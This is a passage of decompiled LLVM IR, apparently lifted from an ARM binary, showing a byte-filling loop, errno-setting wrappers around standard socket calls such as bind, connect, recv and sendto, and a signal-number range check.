  %v11_13d2c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_13d2c, i32* %v10_13d2c, align 4
  %v12_13d2c = add i32 %v0_13d0054, 32
  store i32 %v12_13d2c, i32* %r3.global-to-local, align 4
  %v6_13d30 = load i32, i32* %r2.global-to-local, align 4
  %v7_13d30 = add i32 %v6_13d30, -8
  store i32 %v7_13d30, i32* %r2.global-to-local, align 4
  %v5_13cfc = icmp slt i32 %v7_13d30, 8
  br i1 %v5_13cfc, label %dec_label_pc_13cf8.dec_label_pc_13d38.loopexit_crit_edge, label %dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge

dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge:  ; preds = %dec_label_pc_13cf8
  %v2_13d00.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13d00 = inttoptr i32 %v12_13d2c to i32*
  store i32 %v2_13d00.pre, i32* %v1_13d00, align 4
  %v3_13d00 = add i32 %v0_13d0054, 36
  %v4_13d00 = inttoptr i32 %v3_13d00 to i32*
  %v5_13d00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13d00, i32* %v4_13d00, align 4
  %v6_13d00 = add i32 %v0_13d0054, 40
  store i32 %v6_13d00, i32* %r3.global-to-local, align 4
  %v0_13d04 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d04 = add i32 %v0_13d04, -8
  store i32 %v1_13d04, i32* %r2.global-to-local, align 4
  %v5_13d0c = icmp slt i32 %v1_13d04, 8
  br i1 %v5_13d0c, label %dec_label_pc_13d00.dec_label_pc_13d38.loopexit_crit_edge, label %dec_label_pc_13d10

dec_label_pc_13d00.dec_label_pc_13d38.loopexit_crit_edge: ; preds = %dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge, %dec_label_pc_13d00.preheader
  %v1_13d04.lcssa = phi i32 [ %v1_13d0452, %dec_label_pc_13d00.preheader ], [ %v1_13d04, %dec_label_pc_13cf8.dec_label_pc_13d00_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d38

dec_label_pc_13cf8.dec_label_pc_13d38.loopexit_crit_edge: ; preds = %dec_label_pc_13cf8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d38

dec_label_pc_13d10.dec_label_pc_13d38.loopexit_crit_edge: ; preds = %dec_label_pc_13d10
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d38

dec_label_pc_13d20.dec_label_pc_13d38.loopexit_crit_edge: ; preds = %dec_label_pc_13d20
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %dec_label_pc_13cf4, %dec_label_pc_13d00.dec_label_pc_13d38.loopexit_crit_edge, %dec_label_pc_13cf8.dec_label_pc_13d38.loopexit_crit_edge, %dec_label_pc_13d10.dec_label_pc_13d38.loopexit_crit_edge, %dec_label_pc_13d20.dec_label_pc_13d38.loopexit_crit_edge, %dec_label_pc_13cd0
  %v0_13d40 = phi i32 [ %v0_13cd4, %dec_label_pc_13cd0 ], [ %v1_13d24, %dec_label_pc_13d20.dec_label_pc_13d38.loopexit_crit_edge ], [ %v1_13d14, %dec_label_pc_13d10.dec_label_pc_13d38.loopexit_crit_edge ], [ %v7_13d30, %dec_label_pc_13cf8.dec_label_pc_13d38.loopexit_crit_edge ], [ %v1_13d04.lcssa, %dec_label_pc_13d00.dec_label_pc_13d38.loopexit_crit_edge ], [ %v0_13cf8.pr, %dec_label_pc_13cf4 ]
  %v2_13d38 = icmp eq i32 %v0_13d40, 0
  store i1 %v2_13d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d38, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13d38
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13d38
  %v1_13d40 = sub i32 7, %v0_13d40
  store i32 %v1_13d40, i32* %r2.global-to-local, align 4
  %v3_13d44 = mul i32 %v1_13d40, 4
  %v4_13d44 = add i32 %v3_13d44, ptrtoint (i32* @global_var_13d4c.609 to i32)
  call void @__pseudo_branch(i32 %v4_13d44)
  %v0_13d4c = load i32, i32* %r1.global-to-local, align 4
  %v1_13d4c = trunc i32 %v0_13d4c to i8
  %v2_13d4c = load i32, i32* %r3.global-to-local, align 4
  %v3_13d4c = inttoptr i32 %v2_13d4c to i8*
  store i8 %v1_13d4c, i8* %v3_13d4c, align 1
  %v4_13d4c = load i32, i32* %r3.global-to-local, align 4
  %v5_13d4c = add i32 %v4_13d4c, 1
  store i32 %v5_13d4c, i32* %r3.global-to-local, align 4
  %v0_13d50 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d50 = trunc i32 %v0_13d50 to i8
  %v3_13d50 = inttoptr i32 %v5_13d4c to i8*
  store i8 %v1_13d50, i8* %v3_13d50, align 1
  %v4_13d50 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d50 = add i32 %v4_13d50, 1
  store i32 %v5_13d50, i32* %r3.global-to-local, align 4
  %v0_13d54 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d54 = trunc i32 %v0_13d54 to i8
  %v3_13d54 = inttoptr i32 %v5_13d50 to i8*
  store i8 %v1_13d54, i8* %v3_13d54, align 1
  %v4_13d54 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d54 = add i32 %v4_13d54, 1
  store i32 %v5_13d54, i32* %r3.global-to-local, align 4
  %v0_13d58 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d58 = trunc i32 %v0_13d58 to i8
  %v3_13d58 = inttoptr i32 %v5_13d54 to i8*
  store i8 %v1_13d58, i8* %v3_13d58, align 1
  %v4_13d58 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d58 = add i32 %v4_13d58, 1
  store i32 %v5_13d58, i32* %r3.global-to-local, align 4
  %v0_13d5c = load i32, i32* %r1.global-to-local, align 4
  %v1_13d5c = trunc i32 %v0_13d5c to i8
  %v3_13d5c = inttoptr i32 %v5_13d58 to i8*
  store i8 %v1_13d5c, i8* %v3_13d5c, align 1
  %v4_13d5c = load i32, i32* %r3.global-to-local, align 4
  %v5_13d5c = add i32 %v4_13d5c, 1
  store i32 %v5_13d5c, i32* %r3.global-to-local, align 4
  %v0_13d60 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d60 = trunc i32 %v0_13d60 to i8
  %v3_13d60 = inttoptr i32 %v5_13d5c to i8*
  store i8 %v1_13d60, i8* %v3_13d60, align 1
  %v4_13d60 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d60 = add i32 %v4_13d60, 1
  store i32 %v5_13d60, i32* %r3.global-to-local, align 4
  %v0_13d64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d64 = trunc i32 %v0_13d64 to i8
  %v3_13d64 = inttoptr i32 %v5_13d60 to i8*
  store i8 %v1_13d64, i8* %v3_13d64, align 1
  %v4_13d64 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d64 = add i32 %v4_13d64, 1
  store i32 %v5_13d64, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13d00, { 1, 0 }
  uselistorder i32 %v12_13d2c, { 1, 2, 0 }
  uselistorder i32 %v0_13d0054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13cf8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13ce8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_13cdc, { 1, 0 }
  uselistorder i32 %v0_13cd4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 4, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13d38, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13d10, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_13d70(i32 %arg1) local_unnamed_addr {
dec_label_pc_13d70:
  %stack_var_-8 = alloca i32, align 4
  %v2_13d74 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_13d74, i32* @r1, align 4
  %v0_13d7c = call i32 @function_15d80()
  %v2_13d80 = icmp eq i32 %v0_13d7c, 0
  br i1 %v2_13d80, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13d70
  %v3_13d88 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13d70, %bb
  %v5_13d90 = phi i32 [ -1, %dec_label_pc_13d70 ], [ %v3_13d88, %bb ]
  ret i32 %v5_13d90

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13d94(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13d94:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d94 = load i32, i32* @r4, align 4
  store i32 %v3_13d94, i32* %stack_var_-8, align 4
  %v5_13d98 = inttoptr i32 %arg3 to i32*
  %v6_13d98 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_13d98)
  store i32 %v6_13d98, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_13d98, -4095
  br i1 %tmp, label %dec_label_pc_13db8, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13d94
  %v0_13da8 = call i32 @function_13c70()
  %v0_13dac = load i32, i32* %r4.global-to-local, align 4
  %v1_13dac = sub i32 0, %v0_13dac
  %v2_13db0 = inttoptr i32 %v0_13da8 to i32*
  store i32 %v1_13dac, i32* %v2_13db0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13db8

dec_label_pc_13db8:                               ; preds = %dec_label_pc_13d94, %dec_label_pc_13da8
  %v0_13db8 = phi i32 [ %v6_13d98, %dec_label_pc_13d94 ], [ -1, %dec_label_pc_13da8 ]
  %v2_13dbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13dbc, i32* @r4, align 4
  ret i32 %v0_13db8

; uselistorder directives
  uselistorder i32 %v6_13d98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13db8, { 1, 0 }
}

define i32 @function_13dc0(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13dc0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13dc0 = load i32, i32* @r4, align 4
  store i32 %v3_13dc0, i32* %stack_var_-8, align 4
  %v5_13dc4 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_13dc4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13dc4, -4095
  br i1 %tmp, label %dec_label_pc_13de4, label %dec_label_pc_13dd4

dec_label_pc_13dd4:                               ; preds = %dec_label_pc_13dc0
  %v0_13dd4 = call i32 @function_13c70()
  %v0_13dd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13dd8 = sub i32 0, %v0_13dd8
  %v2_13ddc = inttoptr i32 %v0_13dd4 to i32*
  store i32 %v1_13dd8, i32* %v2_13ddc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13de4

dec_label_pc_13de4:                               ; preds = %dec_label_pc_13dc0, %dec_label_pc_13dd4
  %v0_13de4 = phi i32 [ %v5_13dc4, %dec_label_pc_13dc0 ], [ -1, %dec_label_pc_13dd4 ]
  %v2_13de8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13de8, i32* @r4, align 4
  ret i32 %v0_13de4

; uselistorder directives
  uselistorder i32 %v5_13dc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13de4, { 1, 0 }
}

define i32 @function_13dec(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13dec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13dec = load i32, i32* @r4, align 4
  store i32 %v3_13dec, i32* %stack_var_-8, align 4
  %v5_13df0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_13df0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13df0, -4095
  br i1 %tmp, label %dec_label_pc_13e10, label %dec_label_pc_13e00

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13dec
  %v0_13e00 = call i32 @function_13c70()
  %v0_13e04 = load i32, i32* %r4.global-to-local, align 4
  %v1_13e04 = sub i32 0, %v0_13e04
  %v2_13e08 = inttoptr i32 %v0_13e00 to i32*
  store i32 %v1_13e04, i32* %v2_13e08, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e10

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13dec, %dec_label_pc_13e00
  %v0_13e10 = phi i32 [ %v5_13df0, %dec_label_pc_13dec ], [ -1, %dec_label_pc_13e00 ]
  %v2_13e14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e14, i32* @r4, align 4
  ret i32 %v0_13e10

; uselistorder directives
  uselistorder i32 %v5_13df0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e10, { 1, 0 }
}

define i32 @function_13e18(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13e18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e18 = load i32, i32* @r4, align 4
  store i32 %v3_13e18, i32* %stack_var_-8, align 4
  %v5_13e1c = inttoptr i32 %arg3 to i32*
  %v6_13e1c = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_13e1c)
  store i32 %v6_13e1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_13e1c, -4095
  br i1 %tmp, label %dec_label_pc_13e3c, label %dec_label_pc_13e2c

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e18
  %v0_13e2c = call i32 @function_13c70()
  %v0_13e30 = load i32, i32* %r4.global-to-local, align 4
  %v1_13e30 = sub i32 0, %v0_13e30
  %v2_13e34 = inttoptr i32 %v0_13e2c to i32*
  store i32 %v1_13e30, i32* %v2_13e34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e3c

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e18, %dec_label_pc_13e2c
  %v0_13e3c = phi i32 [ %v6_13e1c, %dec_label_pc_13e18 ], [ -1, %dec_label_pc_13e2c ]
  %v2_13e40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e40, i32* @r4, align 4
  ret i32 %v0_13e3c

; uselistorder directives
  uselistorder i32 %v6_13e1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e3c, { 1, 0 }
}

define i32 @function_13e44(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13e44:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e44 = load i32, i32* @r4, align 4
  store i32 %v3_13e44, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13e4c = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  store i32 %v5_13e4c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13e4c, -4095
  br i1 %tmp, label %dec_label_pc_13e6c, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e44
  %v0_13e5c = call i32 @function_13c70()
  %v0_13e60 = load i32, i32* %r4.global-to-local, align 4
  %v1_13e60 = sub i32 0, %v0_13e60
  %v2_13e64 = inttoptr i32 %v0_13e5c to i32*
  store i32 %v1_13e60, i32* %v2_13e64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e6c

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e5c
  %v0_13e6c = phi i32 [ %v5_13e4c, %dec_label_pc_13e44 ], [ -1, %dec_label_pc_13e5c ]
  %v2_13e70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e70, i32* @r4, align 4
  ret i32 %v0_13e6c

; uselistorder directives
  uselistorder i32 %v5_13e4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e6c, { 1, 0 }
}

define i32 @function_13e74(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e74 = load i32, i32* @r4, align 4
  store i32 %v3_13e74, i32* %stack_var_-8, align 4
  %v2_13e78 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_13e78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13e78, -4095
  br i1 %tmp, label %dec_label_pc_13e98, label %dec_label_pc_13e88

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e74
  %v0_13e88 = call i32 @function_13c70()
  %v0_13e8c = load i32, i32* %r4.global-to-local, align 4
  %v1_13e8c = sub i32 0, %v0_13e8c
  %v2_13e90 = inttoptr i32 %v0_13e88 to i32*
  store i32 %v1_13e8c, i32* %v2_13e90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e98

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e74, %dec_label_pc_13e88
  %v0_13e98 = phi i32 [ %v2_13e78, %dec_label_pc_13e74 ], [ -1, %dec_label_pc_13e88 ]
  %v2_13e9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e9c, i32* @r4, align 4
  ret i32 %v0_13e98

; uselistorder directives
  uselistorder i32 %v2_13e78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e98, { 1, 0 }
}

define i32 @function_13ea0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13ea0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ea0 = load i32, i32* @r4, align 4
  store i32 %v3_13ea0, i32* %stack_var_-8, align 4
  %v5_13ea4 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_13ea4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13ea4, -4095
  br i1 %tmp, label %dec_label_pc_13ec4, label %dec_label_pc_13eb4

dec_label_pc_13eb4:                               ; preds = %dec_label_pc_13ea0
  %v0_13eb4 = call i32 @function_13c70()
  %v0_13eb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13eb8 = sub i32 0, %v0_13eb8
  %v2_13ebc = inttoptr i32 %v0_13eb4 to i32*
  store i32 %v1_13eb8, i32* %v2_13ebc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ec4

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13ea0, %dec_label_pc_13eb4
  %v0_13ec4 = phi i32 [ %v5_13ea4, %dec_label_pc_13ea0 ], [ -1, %dec_label_pc_13eb4 ]
  %v2_13ec8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ec8, i32* @r4, align 4
  ret i32 %v0_13ec4

; uselistorder directives
  uselistorder i32 %v5_13ea4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ec4, { 1, 0 }
}

define i32 @function_13ecc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13ecc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13ecc = load i32, i32* @r4, align 4
  store i32 %v3_13ecc, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13ed8 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  store i32 %v5_13ed8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13ed8, -4095
  br i1 %tmp, label %dec_label_pc_13ef8, label %dec_label_pc_13ee8

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13ecc
  %v0_13ee8 = call i32 @function_13c70()
  %v0_13eec = load i32, i32* %r4.global-to-local, align 4
  %v1_13eec = sub i32 0, %v0_13eec
  %v2_13ef0 = inttoptr i32 %v0_13ee8 to i32*
  store i32 %v1_13eec, i32* %v2_13ef0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ecc, %dec_label_pc_13ee8
  %v0_13ef8 = phi i32 [ %v5_13ed8, %dec_label_pc_13ecc ], [ -1, %dec_label_pc_13ee8 ]
  %v2_13efc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13efc, i32* @r4, align 4
  ret i32 %v0_13ef8

; uselistorder directives
  uselistorder i32 %v5_13ed8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ef8, { 1, 0 }
}

define i32 @function_13f00(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13f00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f00 = load i32, i32* @r4, align 4
  store i32 %v3_13f00, i32* %stack_var_-8, align 4
  %v5_13f04 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_13f04, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13f04, -4095
  br i1 %tmp, label %dec_label_pc_13f24, label %dec_label_pc_13f14

dec_label_pc_13f14:                               ; preds = %dec_label_pc_13f00
  %v0_13f14 = call i32 @function_13c70()
  %v0_13f18 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f18 = sub i32 0, %v0_13f18
  %v2_13f1c = inttoptr i32 %v0_13f14 to i32*
  store i32 %v1_13f18, i32* %v2_13f1c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f24

dec_label_pc_13f24:                               ; preds = %dec_label_pc_13f00, %dec_label_pc_13f14
  %v0_13f24 = phi i32 [ %v5_13f04, %dec_label_pc_13f00 ], [ -1, %dec_label_pc_13f14 ]
  %v2_13f28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f28, i32* @r4, align 4
  ret i32 %v0_13f24

; uselistorder directives
  uselistorder i32 %v5_13f04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f24, { 1, 0 }
}

define i32 @function_13f2c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13f2c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13f38 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_13f38, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13f38, -4095
  br i1 %tmp, label %dec_label_pc_13f58, label %dec_label_pc_13f48

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f2c
  %v0_13f48 = call i32 @function_13c70()
  %v0_13f4c = load i32, i32* %r4.global-to-local, align 4
  %v1_13f4c = sub i32 0, %v0_13f4c
  %v2_13f50 = inttoptr i32 %v0_13f48 to i32*
  store i32 %v1_13f4c, i32* %v2_13f50, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f2c, %dec_label_pc_13f48
  %v0_13f58 = phi i32 [ %v5_13f38, %dec_label_pc_13f2c ], [ -1, %dec_label_pc_13f48 ]
  ret i32 %v0_13f58

; uselistorder directives
  uselistorder i32 %v5_13f38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f58, { 1, 0 }
}

define i32 @function_13f60(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13f60:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f60 = load i32, i32* @r4, align 4
  store i32 %v3_13f60, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13f68 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_13f68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13f68, -4095
  br i1 %tmp, label %dec_label_pc_13f88, label %dec_label_pc_13f78

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f60
  %v0_13f78 = call i32 @function_13c70()
  %v0_13f7c = load i32, i32* %r4.global-to-local, align 4
  %v1_13f7c = sub i32 0, %v0_13f7c
  %v2_13f80 = inttoptr i32 %v0_13f78 to i32*
  store i32 %v1_13f7c, i32* %v2_13f80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f88

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f60, %dec_label_pc_13f78
  %v0_13f88 = phi i32 [ %v5_13f68, %dec_label_pc_13f60 ], [ -1, %dec_label_pc_13f78 ]
  %v2_13f8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f8c, i32* @r4, align 4
  ret i32 %v0_13f88

; uselistorder directives
  uselistorder i32 %v5_13f68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f88, { 1, 0 }
}

define i32 @function_13f90(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13f90:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f90 = load i32, i32* @r4, align 4
  store i32 %v3_13f90, i32* %stack_var_-8, align 4
  %v3_13f94 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_13f94, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_13f94, -4095
  br i1 %tmp, label %dec_label_pc_13fb4, label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f90
  %v0_13fa4 = call i32 @function_13c70()
  %v0_13fa8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fa8 = sub i32 0, %v0_13fa8
  %v2_13fac = inttoptr i32 %v0_13fa4 to i32*
  store i32 %v1_13fa8, i32* %v2_13fac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13fb4

dec_label_pc_13fb4:                               ; preds = %dec_label_pc_13f90, %dec_label_pc_13fa4
  %v0_13fb4 = phi i32 [ %v3_13f94, %dec_label_pc_13f90 ], [ -1, %dec_label_pc_13fa4 ]
  %v2_13fb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13fb8, i32* @r4, align 4
  ret i32 %v0_13fb4

; uselistorder directives
  uselistorder i32 %v3_13f94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fb4, { 1, 0 }
}

define i32 @function_13fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13fbc:
  %v3_13fbc = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13fc4 = call i32 @function_136f4()
  %v0_13fc8 = load i32, i32* @r4, align 4
  store i32 %v3_13fbc, i32* @r4, align 4
  %v2_13fd0 = call i32 @function_1379c(i32 %v0_13fc4, i32 %v0_13fc8)
  ret i32 %v2_13fd0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_1379c, { 14, 15, 9, 13, 12, 11, 10, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_136f4, { 0, 1, 3, 2 }
}

define i32 @function_13fd4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13fd4:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_13ff0, label %dec_label_pc_13fe0

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_13fd4
  %v8_13fe4 = icmp sgt i32 %arg1, 64
  br i1 %v8_13fe4, label %dec_label_pc_13ff0, label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fe0
  %v0_13fec = call i32 @function_140f8()
  br label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13fe0, %dec_label_pc_13fd4, %dec_label_pc_13fe8
  %v0_13ff0 = call i32 @function_13c70()
  %v2_13ff8 = inttoptr i32 %v0_13ff0 to i32*
  store i32 22, i32* %v2_13ff8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ff0, { 2, 0, 1 }
}

define i32 @function_14004(i32 %arg1) local_unnamed_addr {
dec_label_pc_14004:
  store i32 128, i32* @r2, align 4
  %v0_14010 = load i32, i32* @r0, align 4
  %v2_14010 = inttoptr i32 %v0_14010 to i8*
